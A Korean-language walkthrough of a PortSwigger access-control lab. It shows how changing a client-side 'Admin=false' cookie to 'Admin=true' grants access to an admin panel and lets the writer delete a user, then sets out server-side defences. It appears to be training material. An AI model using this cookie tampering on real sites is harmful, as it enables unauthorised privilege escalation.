# Lab: User role controlled by request parameter

## 개요

- **난이도**: Apprentice
- **주제**: Access Control — 파라미터 기반 접근 제어 / 쿠키(Cookie) 역할 조작 / 수직적 권한 상승
- **링크**: https://portswigger.net/web-security/access-control/lab-user-role-controlled-by-request-parameter

## 목표

로그인 시 발급되는 `Admin` 쿠키 값을 클라이언트에서 조작해 관리자로 인식되도록 만들고, `/admin` 패널에 접근해 `carlos` 계정을 삭제한다.

- 계정: `wiener:peter`

## 이전 랩(001, 002)과의 차이

```
[001 / 002 — unprotected functionality]
  관리자 기능에 접근 제어가 아예 없음
  → 경로만 알면 접근

[003 — parameter-based access control (이번)]
  접근 제어는 존재하지만, 사용자가 조작 가능한 값(쿠키)에 의존
  → Admin=false / Admin=true 쿠키로 역할을 스스로 결정
```

핵심: **접근 제어 결정을 클라이언트가 제어하는 값에 두면 안 된다.**

## 취약 지점

### 파라미터 기반 접근 제어 (Parameter-based Access Control)

애플리케이션이 사용자의 역할/권한을 **사용자 제어 가능한 위치**에 저장하고,
그 값으로 접근을 결정하는 방식. 대표적인 저장 위치:

```
- 숨겨진 폼 필드 (hidden field)
- 쿠키 (cookie)
- 미리 설정된 쿼리 파라미터 (role=1, admin=true)
```

이번 랩에서는 **쿠키**에 역할 정보가 담긴다.

```
로그인 응답:
  Set-Cookie: Admin=false; session=<...>

/admin 요청:
  Cookie: Admin=false; session=<...>
  → 서버가 Admin 쿠키만 보고 관리자 여부 판단
  → false 이므로 접근 거부
```

### 문제의 본질

```
서버의 판단 근거:
  "요청의 Admin 쿠키가 true 인가?"

공격자:
  Admin 쿠키 값을 true 로 바꿔 전송
  → 서버는 이를 관리자로 인식
  → 수직적 권한 상승
```

역할 정보가 서버 측(세션 저장소/DB)에 있고 서버가 매 요청마다 검증한다면
이 조작은 불가능하다.

## 공격 단계

### 1단계 — /admin 접근 시도 (거부 확인)

```
GET /admin HTTP/1.1
Host: LAB-ID.web-security-academy.net
```

```
→ Admin=false (또는 미인증) 이므로 관리자 패널 접근 불가
```

### 2단계 — wiener 로 로그인하며 응답 관찰

Burp Proxy 의 response interception 을 켜고 로그인 요청/응답을 확인한다.

```
POST /login HTTP/1.1
...

username=wiener&password=peter
```

응답 헤더:

```
HTTP/1.1 302 Found
Set-Cookie: Admin=false; session=...
```

역할이 `Admin` 쿠키로 내려오는 것을 확인한다.

### 3단계 — Admin 쿠키 조작

이후 요청에서 `Admin=false` 를 `Admin=true` 로 바꿔 전송한다.

```
GET /admin HTTP/1.1
Host: LAB-ID.web-security-academy.net
Cookie: Admin=true; session=...
```

### 4단계 — carlos 삭제

관리자 패널이 반환되면 삭제 기능을 호출한다.

```
GET /admin/delete?username=carlos HTTP/1.1
Host: LAB-ID.web-security-academy.net
Cookie: Admin=true; session=...
```

carlos 삭제 완료 → 랩 해결.

## 쿠키 조작 방법

```
[브라우저 개발자 도구]
  Application → Storage → Cookies → Admin 값을 true 로 수정

[Burp Suite]
  로그인 응답의 Set-Cookie: Admin=false 를 Admin=true 로 수정
  이후 모든 요청에 Cookie: Admin=true 가 자동 포함되도록 세션 유지

[Repeater / curl]
  Cookie 헤더에 Admin=true 를 직접 포함해 요청
```

## 방어

```
[근본 원인]
  관리자 여부를 클라이언트가 조작 가능한 쿠키 값으로 판단

[잘못된 접근]
  Set-Cookie: Admin=false  →  사용자가 true 로 변경 가능
  hidden field role=user    →  변조 가능
  ?admin=true               →  변조 가능

[올바른 방어]
  1. 역할/권한은 서버 측 신뢰 저장소에 보관
     - 세션 ID → 서버의 세션 데이터(역할 포함)
     - 사용자가 역할 값을 직접 전달하지 않도록 설계
  2. 매 요청마다 서버 측 세션에서 역할을 조회해 인가
     - 쿠키는 "누구인지" 식별용일 뿐, "권한" 의 근거가 아님
     - 쿠키 값은 무결성 보호(서명) 또는 서버 저장
  3. 민감 기능에는 deny by default 인가 적용
  4. 역할 파라미터를 받더라도 서버에서 재검증 (클라이언트 신뢰 금지)
```

## 핵심 정리

- 로그인 시 `Admin=false` 쿠키가 발급되고, 서버가 이 쿠키만으로 관리자 여부를 판단했다.
- 쿠키를 `Admin=true` 로 조작해 `/admin` 에 접근하고 `carlos` 를 삭제했다.
- 역할/권한 정보를 클라이언트 제어 값(쿠키·hidden field·쿼리)에 두면 수직적 권한 상승이 가능하다.
- 방어는 역할을 서버 측 저장소에 두고 매 요청마다 서버에서 검증하는 것이다.

## 배운 점

- 001/002 는 "검사가 없음" 이었고, 003 은 "검사를 잘못된 값에 의존" 한 경우다.
- 쿠키는 인증 상태 식별에 쓰일 수 있지만, 권한 판단의 근거가 되어서는 안 된다.
- 접근 제어 취약점을 찾을 때 "서버가 무엇을 근거로 판단하는가" 를 관찰하는 것이 핵심이며, 쿠키/파라미터/헤더를 하나씩 변조해 보는 것이 효과적이다.
